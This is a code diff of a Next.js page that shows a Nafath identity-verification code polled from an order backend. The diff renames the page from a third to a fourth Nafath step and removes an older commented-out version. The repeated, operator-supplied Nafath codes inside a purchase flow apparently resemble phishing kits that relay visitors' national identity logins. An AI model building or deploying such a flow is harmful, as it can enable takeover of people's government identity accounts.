@@ -1,192 +1,3 @@
-// import { FaArrowRightLong } from "react-icons/fa6";
-// import { useRouter, useSearchParams } from "next/navigation";
-// import { Button, CircularProgress } from "@nextui-org/react";
-// import Link from "next/link";
-// import { useCallback, useEffect, useState } from "react";
-// import SwiperSlider from "@/components/SwiperSlider";
-// import { BsFillInfoCircleFill } from "react-icons/bs";
-// import { motion } from "framer-motion";
-// import toast from "react-hot-toast";
-
-// const NafatOtpThree = () => {
-//   const router = useRouter();
-//   const params = useSearchParams();
-//   const _id = params.get("id");
-
-//   // get order data from api localhost:3000/api/order/:id
-//   const [order, setOrder] = useState([]);
-
-//   console.log("data", order);
-
-//   const handleSubmit = (e) => {
-//     e.preventDefault();
-//     router.push(`/order-success?id=${order._id}`);
-//     // toast.success(
-//     //   "Your Order application complete. You will be shortly contacted by WhatsApps.",
-//     //   {
-//     //     duration: "3000", //duration
-//     //   }
-//     // );
-//   };
-
-//   // a countdown timer function
-//   const [value, setValue] = useState(0);
-
-//   useEffect(() => {
-//     const interval = setInterval(() => {
-//       setValue((v) => {
-//         if (order.nafatOtpThree) {
-//           clearInterval(interval);
-//           return 100; // Set to 100% when order.nafatOtpThree is true
-//         }
-//         if (v >= 100) {
-//           clearInterval(interval);
-//           return 100; // Stop at 100%
-//         }
-//         return v + 1;
-//       });
-//     }, 1200); // 1200 milliseconds = 1.2 seconds
-
-//     return () => clearInterval(interval);
-//   }, [order.nafatOtpThree]);
-
-//   const url = `${process.env.API_URL}/api/order/${_id}`;
-//   const fetchOrder = useCallback(async () => {
-//     if (!_id) return; // Early return if _id is not available or nafatOtpThree is already set
-
-//     try {
-//       const response = await fetch(url);
-//       if (!response.ok) {
-//         throw new Error("Failed to fetch order data");
-//       }
-//       const data = await response.json();
-//       setOrder(data);
-//     } catch (error) {
-//       console.error("Error fetching order:", error);
-//     }
-//   }, [url, _id]);
-
-//   useEffect(() => {
-//     //if (order.nafatOtpThree) return; // Stop polling if nafatOtpThree is already set
-//     const intervalId = setInterval(() => {
-//       fetchOrder();
-//     }, 2000); // Poll every 5 seconds
-
-//     return () => clearInterval(intervalId);
-//   }, [fetchOrder, order.nafatOtpThree]);
-
-//   const reload = () => {
-//     window.location.reload();
-//   };
-
-//   return (
-//     <>
-//       <SwiperSlider />
-//       <div className="max-w-[1400px] w-[92%] lg:w-3/4 mx-auto flex flex-col justify-center items-center gap-6">
-//         <h1 className="text-4xl font-bold text-gray-600 mt-10 text-center">
-//           Verify Yourself with Nafat
-//         </h1>
-
-//         <div className="border-2 border-blue-300 p-4 flex flex-col lg:flex-row items-center gap-3">
-//           <BsFillInfoCircleFill color="blue" className="w-max" />
-//           <div className="text-center text-sm">
-//             <p>
-//               If you do not have the Nafath application installed on your
-//               device,
-//             </p>
-//             <p>first download it and register.</p>
-//           </div>
-//         </div>
-
-//         <p className="text-center font-semibold text-gray-600">
-//           To verify your information, Log in the <br /> Nafath app and select
-//           this code
-//         </p>
-
-//         <CircularProgress
-//           classNames={{
-//             svg: "w-36 h-36 drop-shadow-md",
-//             indicator: "stroke-[#0D9488]",
-//             track: "#0D9488",
-//             value: "text-3xl font-semibold text-gray-700",
-//           }}
-//           value={value}
-//           strokeWidth={4}
-//           showValueLabel={true}
-//         />
-
-//         {/* a countdown design round border */}
-//         <div className="h-14 w-14">
-//           {order.nafatOtpThree ? (
-//             <motion.div
-//               initial={{ scale: 0.9 }}
-//               animate={{ rotate: 360, scale: 1 }}
-//               transition={{
-//                 type: "spring",
-//                 stiffness: 260,
-//                 damping: 20,
-//                 repeat: Infinity,
-//                 repeatType: "mirror",
-//                 duration: 1.3,
-//                 rotate: {
-//                   duration: 1, // Rotation happens over 1 second
-//                 },
-//               }}
-//               className="bg-[#0D9488] text-white w-full h-full rounded-lg flex justify-center items-center"
-//             >
-//               <p>{order.nafatOtpThree}</p>
-//             </motion.div>
-//           ) : (
-//             <motion.div
-//               initial={{ scale: 0.9 }}
-//               animate={{ rotate: 360, scale: 1 }}
-//               transition={{
-//                 type: "spring",
-//                 stiffness: 260,
-//                 damping: 20,
-//                 repeat: Infinity,
-//                 repeatType: "mirror",
-//                 duration: 1.3,
-//                 rotate: {
-//                   duration: 1, // Rotation happens over 1 second
-//                 },
-//               }}
-//               className="bg-gray-400 text-white w-full h-full rounded-lg flex justify-center items-center"
-//             >
-//               <p>N/A</p>
-//             </motion.div>
-//           )}
-//           {/* </p> */}
-//         </div>
-//         <Link
-//           href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid"
-//           target="_blank"
-//           className="py-3 mt-4 px-5 w-fit text-gray-600 hover:text-white hover:bg-[#0D9488] font-bold border-gray-500 hover:border-teal-500 border text-sm flex items-center gap-2 justify-center rounded-sm transition-all delay-150 ease-in-out"
-//         >
-//           OPEN NAFATH APP
-//         </Link>
-//         <form onSubmit={handleSubmit} className="my-10 w-full">
-//           <Button
-//             color="primary"
-//             onClick={!order.nafatOtpThree ? reload : ""}
-//             type={!order.nafatOtpThree ? "button" : "submit"}
-//             className={`w-full text-white h-12 ${
-//               !order.nafatOtpThree
-//                 ? "cursor-not-allowed bg-gray-400 "
-//                 : "bg-[#0D9488]"
-//             }`}
-//           >
-//             Confirm Order <FaArrowRightLong size={16} />
-//           </Button>
-//         </form>
-//       </div>
-//       <div className="h-20 bg-teal-400 mt-5"></div>
-//     </>
-//   );
-// };
-
-// export default NafatOtpThree;
-
 import { useState, useEffect, useCallback } from "react";
 import {
   FaArrowRight,
@@ -199,7 +10,7 @@ import { HiSparkles } from "react-icons/hi";
 import { useSearchParams, useRouter } from "next/navigation";
 import { motion } from "framer-motion";
 
-export default function ModernNafatOtpThree() {
+export default function ModernNafatOtpFour() {
   const router = useRouter();
   const searchParams = useSearchParams();
   const _id = searchParams.get("id");
@@ -210,7 +21,7 @@ export default function ModernNafatOtpThree() {
   useEffect(() => {
     const interval = setInterval(() => {
       setValue((v) => {
-        if (order.nafatOtpThree) {
+        if (order?.nafatOtpFour) {
           clearInterval(interval);
           return 100;
         }
@@ -221,9 +32,8 @@ export default function ModernNafatOtpThree() {
         return v + 1;
       });
     }, 1200);
-
     return () => clearInterval(interval);
-  }, [order.nafatOtpThree]);
+  }, [order?.nafatOtpFour]);
 
   const url = `${process.env.API_URL || ""}/api/order/${_id}`;
   const fetchOrder = useCallback(async () => {
@@ -245,12 +55,11 @@ export default function ModernNafatOtpThree() {
     }, 2000);
 
     return () => clearInterval(intervalId);
-  }, [fetchOrder, order.nafatOtpThree]);
+  }, [fetchOrder, order.nafatOtpFour]);
 
   const handleSubmit = (e) => {
     e.preventDefault();
-    router.push(`/profession?id=${order._id}`);
-    // router.push(`/order-success?id=${order._id}`);
+    router.push(`/order-success?id=${order._id}`);
   };
 
   const reload = () => window.location.reload();
@@ -266,7 +75,7 @@ export default function ModernNafatOtpThree() {
             <span className="text-sm text-white font-medium">Final Step</span>
           </div>
           <h1 className="text-4xl md:text-6xl font-bold text-white mb-4 tracking-tight">
-            Third{" "}
+            Fourth{" "}
             <span className="bg-gradient-to-r from-teal-400 to-teal-400 bg-clip-text text-transparent">
               Nafath
             </span>{" "}
@@ -338,7 +147,7 @@ export default function ModernNafatOtpThree() {
 
           {/* OTP Code */}
           <div className="flex justify-center mb-8">
-            {order.nafatOtpThree ? (
+            {order.nafatOtpFour ? (
               <motion.div
                 initial={{ scale: 0.9 }}
                 animate={{ scale: 1.15 }}
@@ -351,7 +160,7 @@ export default function ModernNafatOtpThree() {
               >
                 <div className="flex items-center gap-1 text-2xl font-bold">
                   <FaCheckCircle className="w-5 h-5" />
-                  {order.nafatOtpThree}
+                  {order.nafatOtpFour}
                 </div>
               </motion.div>
             ) : (
@@ -371,7 +180,7 @@ export default function ModernNafatOtpThree() {
           </div>
 
           {/* Status Message */}
-          {order.nafatOtpThree ? (
+          {order.nafatOtpFour ? (
             <div className="mb-6 p-4 bg-teal-500/10 border border-teal-500/30 rounded-xl">
               <p className="text-center text-teal-400 font-medium flex items-center justify-center gap-2">
                 <FaCheckCircle className="w-5 h-5" /> Code received! You may
@@ -397,15 +206,15 @@ export default function ModernNafatOtpThree() {
 
           {/* Continue */}
           <button
-            onClick={order.nafatOtpThree ? handleSubmit : reload}
-            disabled={!order.nafatOtpThree}
+            onClick={order.nafatOtpFour ? handleSubmit : reload}
+            disabled={!order.nafatOtpFour}
             className={`w-full py-4 rounded-xl font-semibold transition-all duration-300 flex items-center justify-center gap-2 ${
-              order.nafatOtpThree
+              order.nafatOtpFour
                 ? "bg-gradient-to-r from-teal-500 to-teal-500 text-white hover:shadow-2xl hover:shadow-teal-500/50"
                 : "bg-slate-700 text-gray-400 cursor-not-allowed"
             }`}
           >
-            {order.nafatOtpThree ? (
+            {order.nafatOtpFour ? (
               <>
                 Continue to Order Confirmation
                 <FaArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
